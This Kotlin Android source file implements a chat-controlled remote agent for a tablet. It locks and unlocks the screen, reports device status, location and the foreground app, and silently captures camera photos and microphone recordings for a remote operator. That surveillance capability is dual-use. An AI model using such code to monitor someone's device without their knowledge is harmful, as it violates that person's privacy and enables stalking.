package id.khamimzarr.tabletagent

import android.Manifest
import android.app.ActivityManager
import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.widget.Toast
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import java.io.File
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Semua aksi yang dulu dijalankan lewat termux-* di sisi klien Node.
 * Versi native: kamera CameraX, mikrofon MediaRecorder, lokasi LocationManager,
 * info sistem dari /proc + BatteryManager + WifiManager.
 */
class Actions(private val ctx: Context, private val owner: LifecycleOwner) {

    private val ui = Handler(Looper.getMainLooper())
    private var pendingLock: Runnable? = null

    // ---------- kendali: status, kunci, buka ----------

    fun keyguardLocked(): Boolean = try {
        val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        km.isKeyguardLocked
    } catch (e: Exception) {
        false
    }

    /** Layar dikunci PIN/pola/sandi? Kalau ya, app biasa tidak boleh membukanya. */
    fun keyguardSecure(): Boolean = try {
        val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        km.isDeviceSecure
    } catch (e: Exception) {
        false
    }

    fun lock(): String {
        if (!DeviceAdmin.isActive(ctx)) return "izin kunci layar belum aktif — buka app ShareMe lalu ketuk \"Aktifkan kunci layar\""
        return try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.lockNow()
            "layar dikunci"
        } catch (e: Exception) {
            "gagal kunci layar: ${e.message}"
        }
    }

    /** Minta UnlockActivity menutup keyguard. Hasil sebenarnya muncul di agent.log / status berikutnya. */
    fun unlock(): String {
        return try {
            val i = Intent(ctx, UnlockActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            ctx.startActivity(i)
            if (keyguardSecure()) {
                "permintaan buka dikirim — tablet pakai PIN/pola, jadi harus dibuka manual di layar"
            } else {
                "permintaan buka dikirim ke layar"
            }
        } catch (e: Exception) {
            "gagal buka layar: ${e.message}"
        }
    }

    /** Buka sekarang, lalu kunci otomatis setelah [minutes] menit. */
    fun unlockFor(minutes: Int): String {
        val m = minutes.coerceIn(1, 240)
        cancelPendingLock()
        val msg = unlock()
        val r = Runnable { lock() }
        pendingLock = r
        ui.postDelayed(r, m * 60_000L)
        return "$msg\n⏳ akan dikunci lagi otomatis dalam $m menit"
    }

    fun cancelPendingLock() {
        pendingLock?.let { ui.removeCallbacks(it) }
        pendingLock = null
    }

    private fun batteryParts(): String {
        return try {
            val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                ?: return "gagal baca"
            val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
            val pct = if (scale > 0) level * 100 / scale else level
            val charging = i.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) != 0
            "$pct%" + if (charging) " (mengisi)" else ""
        } catch (e: Exception) {
            "gagal baca"
        }
    }

    private fun internetText(): String {
        return try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val net = cm.activeNetwork ?: return "tidak ada"
            val cap = cm.getNetworkCapabilities(net) ?: return "tidak ada"
            val transport = when {
                cap.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                    try {
                        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                        val ssid = wm.connectionInfo?.ssid?.trim('"')
                        if (!ssid.isNullOrBlank()) "Wi-Fi $ssid" else "Wi-Fi"
                    } catch (e: Exception) {
                        "Wi-Fi"
                    }
                }
                cap.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "seluler"
                cap.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
                else -> "tersambung"
            }
            if (cap.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) transport else "$transport (tanpa internet)"
        } catch (e: Exception) {
            "tidak diketahui"
        }
    }

    /** Judul aplikasi yang sedang di depan, lewat UsageStats — butuh izin Usage Access. */
    private fun foregroundApp(): String {
        if (!DeviceAdmin.hasUsageAccess(ctx)) return "butuh izin Usage Access"
        return try {
            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val now = System.currentTimeMillis()
            val events = usm.queryEvents(now - 60_000L, now)
            val e = UsageEvents.Event()
            var lastPkg: String? = null
            var lastTime = 0L
            while (events.hasNextEvent()) {
                events.getNextEvent(e)
                if (e.eventType == UsageEvents.Event.ACTIVITY_RESUMED && e.timeStamp >= lastTime) {
                    lastPkg = e.packageName
                    lastTime = e.timeStamp
                }
            }
            val pkg = lastPkg ?: usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 3_600_000L, now)
                ?.maxByOrNull { it.lastTimeUsed }?.packageName
                ?: return "tidak diketahui"
            val pm = ctx.packageManager
            val label = try {
                pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
            } catch (e2: Exception) {
                pkg
            }
            "$label"
        } catch (e: Exception) {
            "tidak terbaca"
        }
    }

    /** Panel kendali untuk chat: satu pesan HTML, isinya status nyata dari perangkat. */
    fun panel(online: Boolean, agentVersion: String): String {
        val locked = keyguardLocked()
        val admin = if (DeviceAdmin.isActive(ctx)) "aktif" else "belum aktif"
        val secure = if (keyguardSecure()) " (pakai PIN)" else " (tanpa PIN)"
        val sb = StringBuilder()
        sb.append("🎛️ <b>KENDALI PERANGKAT</b>\n")
        sb.append("────────────────\n")
        sb.append("📡 <b>Koneksi</b>   ").append(if (online) "🟢 Online" else "🔴 Offline").append(" · agen v").append(agentVersion).append("\n")
        sb.append("🔋 <b>Baterai</b>   ").append(batteryParts()).append("\n")
        sb.append("🔒 <b>Layar</b>     ").append(if (locked) "🔒 terkunci" else "🔓 terbuka").append(secure).append("\n")
        sb.append("📶 <b>Internet</b>  ").append(internetText()).append("\n")
        sb.append("📱 <b>Terbuka</b>   ").append(foregroundApp()).append("\n")
        sb.append("🛡️ <b>Kunci jarak jauh</b>  ").append(admin).append("\n")
        sb.append("\nPilih tindakan:")
        return sb.toString()
    }

    // ---------- system info ----------

    fun systemInfo(): String {
        val lines = mutableListOf<String>()
        lines.add("💻 <b>SYSTEM</b>")
        lines.add("├─ ⚙️ " + cpuLine())
        lines.add("├─ 🖥️ " + ramLine())
        lines.add("├─ 🔋 " + batteryLine())
        lines.add("└─ 🌐 " + wifiLine())
        return lines.joinToString("\n")
    }

    private fun cpuLine(): String {
        return try {
            val a = readCpuTicks() ?: return "⚙️ CPU gagal baca"
            Thread.sleep(1000)
            val b = readCpuTicks() ?: return "⚙️ CPU gagal baca"
            val idle = (b[3] + b[4]) - (a[3] + a[4])
            var total = 0L
            for (i in a.indices) total += b[i] - a[i]
            if (total <= 0) return "⚙️ CPU gagal baca"
            val used = ((total - idle).toDouble() / total * 100).toInt().coerceIn(0, 100)
            "⚙️ CPU $used% terpakai"
        } catch (e: Exception) {
            "⚙️ CPU gagal baca"
        }
    }

    private fun readCpuTicks(): LongArray? {
        return try {
            val line = File("/proc/stat").readLines().firstOrNull { it.startsWith("cpu ") } ?: return null
            val parts = line.trim().split(Regex("\\s+")).drop(1).map { it.toLong() }.toLongArray()
            if (parts.size < 5) null else parts
        } catch (e: Exception) {
            null
        }
    }

    private fun ramLine(): String {
        return try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val mi = ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            val totalMb = mi.totalMem / (1024 * 1024)
            val usedMb = (mi.totalMem - mi.availMem) / (1024 * 1024)
            "🖥️ RAM $usedMb/$totalMb MB"
        } catch (e: Exception) {
            "🖥️ RAM gagal baca"
        }
    }

    private fun batteryLine(): String {
        return try {
            val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                ?: return "🔋 Baterai gagal baca"
            val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
            val pct = if (scale > 0) level * 100 / scale else level
            val temp = i.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, Int.MIN_VALUE)
            val status = when (i.getIntExtra(BatteryManager.EXTRA_STATUS, -1)) {
                BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
                BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
                BatteryManager.BATTERY_STATUS_FULL -> "Full"
                BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not charging"
                else -> "Unknown"
            }
            val tempTxt = if (temp != Int.MIN_VALUE) String.format(Locale.US, ", suhu %.1f°C", temp / 10.0) else ""
            "🔋 Baterai $pct% ($status)$tempTxt"
        } catch (e: Exception) {
            "🔋 Baterai gagal baca"
        }
    }

    @Suppress("DEPRECATION")
    private fun wifiLine(): String {
        return try {
            val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val info = wm.connectionInfo
            if (info == null || info.networkId == -1) return "🌐 Wi-Fi tidak terhubung"
            val ssid = info.ssid?.trim('"') ?: "-"
            val ip = intToIp(info.ipAddress)
            val rssiTxt = if (info.rssi != 0) "${info.rssi} dBm" else "?"
            "🌐 Wi-Fi $ssid @ $ip, sinyal $rssiTxt"
        } catch (e: SecurityException) {
            "🌐 Wi-Fi butuh izin lokasi"
        } catch (e: Exception) {
            "🌐 Wi-Fi gagal baca"
        }
    }

    private fun intToIp(ip: Int): String {
        if (ip == 0) return "-"
        return (0..3).joinToString(".") { ((ip shr (8 * it)) and 0xFF).toString() }
    }

    // ---------- lokasi ----------

    fun location(): String {
        if (!has(Manifest.permission.ACCESS_FINE_LOCATION)) return "izin lokasi belum diberikan"
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val provider = when {
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
            else -> return "GPS dan lokasi jaringan mati di perangkat"
        }
        var best: Location? = null
        val latch = CountDownLatch(1)
        val listener = object : LocationListener {
            override fun onLocationChanged(l: Location) {
                best = l
                latch.countDown()
            }
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {}
            @Deprecated("deprecated di API 29")
            override fun onStatusChanged(p: String?, status: Int, extras: Bundle?) {}
        }
        return try {
            lm.requestLocationUpdates(provider, 0L, 0f, listener, Looper.getMainLooper())
            latch.await(25, TimeUnit.SECONDS)
            lm.removeUpdates(listener)
            val loc = best ?: try { lm.getLastKnownLocation(provider) } catch (e: SecurityException) { null }
            if (loc != null) "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
            else "lokasi tidak didapat (timeout 25s, sinyal lemah?)"
        } catch (e: SecurityException) {
            "izin lokasi ditolak"
        } catch (e: Exception) {
            "gagal baca lokasi: ${e.message}"
        }
    }

    // ---------- kamera ----------

    fun photo(front: Boolean): ByteArray? {
        if (!has(Manifest.permission.CAMERA)) return null
        val file = File(ctx.cacheDir, "shot_${System.currentTimeMillis()}.jpg")
        val latch = CountDownLatch(1)
        var bytes: ByteArray? = null

        Handler(Looper.getMainLooper()).post {
            try {
                val provider = ProcessCameraProvider.getInstance(ctx).get(15, TimeUnit.SECONDS)
                val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
                val capture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()
                provider.unbindAll()
                provider.bindToLifecycle(owner, selector, capture)
                val opts = ImageCapture.OutputFileOptions.Builder(file).build()
                capture.takePicture(opts, ContextCompat.getMainExecutor(ctx), object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(results: ImageCapture.OutputFileResults) {
                        bytes = try {
                            file.readBytes().also { file.delete() }
                        } catch (e: Exception) {
                            null
                        }
                        provider.unbindAll()
                        latch.countDown()
                    }

                    override fun onError(exc: ImageCaptureException) {
                        provider.unbindAll()
                        latch.countDown()
                    }
                })
            } catch (e: Exception) {
                latch.countDown()
            }
        }

        latch.await(30, TimeUnit.SECONDS)
        return bytes
    }

    // ---------- rekam audio ----------

    @Suppress("DEPRECATION")
    fun record(seconds: Int): ByteArray? {
        if (!has(Manifest.permission.RECORD_AUDIO)) return null
        val file = File(ctx.cacheDir, "rec_${System.currentTimeMillis()}.m4a")
        var rec: MediaRecorder? = null
        return try {
            rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else MediaRecorder()
            rec.setAudioSource(MediaRecorder.AudioSource.MIC)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            rec.setAudioEncodingBitRate(96000)
            rec.setAudioSamplingRate(44100)
            rec.setOutputFile(file.absolutePath)
            rec.prepare()
            rec.start()
            Thread.sleep(seconds * 1000L)
            rec.stop()
            rec.release()
            rec = null
            file.readBytes().also { file.delete() }
        } catch (e: Exception) {
            try { rec?.release() } catch (_: Exception) {}
            try { file.delete() } catch (_: Exception) {}
            null
        }
    }

    // ---------- alarm ----------

    fun alarm(text: String): String {
        val done = CountDownLatch(1)
        var spoken = false
        var engine: TextToSpeech? = null
        engine = TextToSpeech(ctx) { status ->
            try {
                if (status == TextToSpeech.SUCCESS) {
                    val e = engine
                    if (e != null) {
                        e.language = Locale("id", "ID")
                        for (i in 1..3) e.speak(text, TextToSpeech.QUEUE_ADD, null, "alarm$i")
                        spoken = true
                    }
                }
            } finally {
                done.countDown()
            }
        }
        val ok = done.await(8, TimeUnit.SECONDS) && spoken

        if (!ok) {
            try {
                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                    ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
                val ring = RingtoneManager.getRingtone(ctx, uri)
                ring.play()
                Thread.sleep(4000)
                ring.stop()
                return "alarm nada dering diputar 4s (TTS tidak tersedia)"
            } catch (e: Exception) {
                return "gagal memutar alarm: ${e.message}"
            }
        }

        Handler(Looper.getMainLooper()).postDelayed({
            try { engine?.stop(); engine?.shutdown() } catch (_: Exception) {}
        }, 15000)
        return "alarm diputar 3x: $text"
    }

    // ---------- test_cmd (subset native) ----------

    fun shell(command: String): String {
        val cmd = command.trim()
        if (cmd.isEmpty()) return "perintah kosong"
        return when {
            cmd.contains("termux-torch on") -> torch(true)
            cmd.contains("termux-torch off") -> torch(false)
            cmd.contains("termux-vibrate") -> vibrate(cmd)
            cmd.startsWith("termux-toast") -> {
                val msg = cmd.removePrefix("termux-toast").trim().trim('"').ifBlank { " " }
                Handler(Looper.getMainLooper()).post { Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show() }
                "toast ditampilkan: $msg"
            }
            else -> "perintah ini butuh shell Termux, aplikasi tidak bisa menjalankannya: $cmd"
        }
    }

    private fun torch(on: Boolean): String {
        return try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull { camId ->
                cm.getCameraCharacteristics(camId).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: return "perangkat tidak punya flash"
            cm.setTorchMode(id, on)
            if (on) "senter menyala" else "senter mati"
        } catch (e: Exception) {
            "gagal atur senter: ${e.message}"
        }
    }

    private fun vibrate(cmd: String): String {
        val ms = Regex("-d\\s+(\\d+)").find(cmd)?.groupValues?.get(1)?.toLongOrNull() ?: 1000L
        return try {
            val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION") v.vibrate(ms)
            }
            "getar ${ms}ms"
        } catch (e: Exception) {
            "gagal getar: ${e.message}"
        }
    }

    private fun has(perm: String) =
        ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
}